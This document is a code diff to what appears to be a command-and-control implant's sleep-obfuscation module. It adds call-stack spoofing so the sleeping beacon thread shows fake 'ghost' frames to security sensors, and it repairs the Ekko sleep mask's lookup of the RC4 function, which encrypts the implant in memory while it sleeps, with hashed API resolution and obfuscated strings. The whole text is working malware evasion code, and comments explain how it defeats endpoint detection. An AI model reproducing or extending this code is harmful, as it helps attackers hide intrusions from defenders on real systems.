@@ -4,12 +4,27 @@
 #include "evasion/sleepmask.h"
 #include "evasion/beacon_gate_impl.h"
 
+// LACUNA synthetic-stack dispatch (see transport/http.cc). The Sleep call is
+// the deepest dwell point - route it through the spoofer so the sleeping
+// stack shows ghost frames instead of raw blob addresses.
+#if defined(INCLUDE_EVASION_CALLSTACK_SPOOF) && defined(_WIN64)
+#include "evasion/callstack_spoof.h"
+#define ES_SPOOFED(inst, fn, n, ...) \
+    callstack_spoofed_call((inst), (PVOID)(fn), (n), ##__VA_ARGS__)
+#else
+#define ghost_chain_plant(inst)      ((void)0)
+#define ghost_chain_restore(inst)    ((void)0)
+// void-returning callee: the shared value-returning fallback cast is illegal
+// on a void expression
+#define ES_SPOOFED(inst, fn, n, ...) ((void)(fn)(__VA_ARGS__))
+#endif
+
 #ifdef INCLUDE_EVASION_HELLSHALL
 #include "evasion/hellshall.h"
 #endif
 
 VOID sleep_mask_none(PINSTANCE inst, DWORD ms) {
-    inst->Win32.Sleep(ms);
+    ES_SPOOFED(inst, inst->Win32.Sleep, 1, ms);
 }
 
 VOID sleep_mask_default(PINSTANCE inst, DWORD ms) {
@@ -23,7 +38,7 @@ VOID sleep_mask_default(PINSTANCE inst, DWORD ms) {
         }
     }
 
-    inst->Win32.Sleep(ms);
+    ES_SPOOFED(inst, inst->Win32.Sleep, 1, ms);
 
     // Unmask
     if (bi->heap_records) {
@@ -141,10 +156,23 @@ VOID sleep_mask_ekko(PINSTANCE inst, DWORD ms) {
     fnWaitForSingleObjectEx pWaitForSingleObjectEx = (fnWaitForSingleObjectEx)resolve_function(k32, hash_string_djb2(_wfso));
     fnVirtualProtect_t      pVirtualProtect       = (fnVirtualProtect_t)resolve_function(k32, hash_string_djb2(_vp));
 
-    // SystemFunction032 is in advapi32 (or cryptbase.dll on newer Windows)
+    // SystemFunction032 (RC4) resolution chain (2026-11-09 fix):
+    //   1. advapi32 - a forwarder to CRYPTSP.SystemFunction032 on modern
+    //      builds; resolves only when cryptsp.dll is already loaded.
+    //   2. cryptsp.dll - where SystemFunction032 actually lives now
+    //      (cryptbase.dll STOPPED exporting it: modern cryptbase carries only
+    //      001-005/028/029/034/036/040/041 - the old fallback silently
+    //      returned NULL and Ekko fell back to the default mask every cycle).
+    //   3. cryptbase.dll - legacy hosts.
     fnSystemFunction032 pSystemFunction032 = NULL;
     if (inst->Modules.Advapi32)
         pSystemFunction032 = (fnSystemFunction032)resolve_function(inst->Modules.Advapi32, hash_string_djb2(_sf032));
+    if (!pSystemFunction032) {
+        xstr(_cryptsp, "cryptsp.dll");
+        HMODULE hCryptSp = inst->Win32.LoadLibraryA(_cryptsp);
+        if (hCryptSp)
+            pSystemFunction032 = (fnSystemFunction032)resolve_function(hCryptSp, hash_string_djb2(_sf032));
+    }
     if (!pSystemFunction032) {
         xstr(_cryptbase, "cryptbase.dll");
         HMODULE hCryptBase = inst->Win32.LoadLibraryA(_cryptbase);
@@ -438,6 +466,14 @@ VOID do_sleep(PINSTANCE inst, DWORD ms) {
             ms = ms - jitter_range / 2 + offset;
         }
     }
+
+    // LACUNA sleep spoofing is now per-call, not a window: every mask paths
+    // its Sleep through the synthetic-stack primitive (see sleep_mask_none /
+    // sleep_mask_default above), so the stack a sensor snapshots during the
+    // dwell is ghost frames without modifying live parent frames. Ekko needs
+    // no extra handling: its timer-queue ROP keeps the mask code off the
+    // stack, and the primitive is never active while the blob is encrypted
+    // (the masked sleep runs on Ekko's own thread, not the agent thread).
 
     if (inst->bBeaconGateEnabled && inst->pfnSleepMask && inst->bSleepMaskLoaded) {
         FUNCTION_CALL fc;
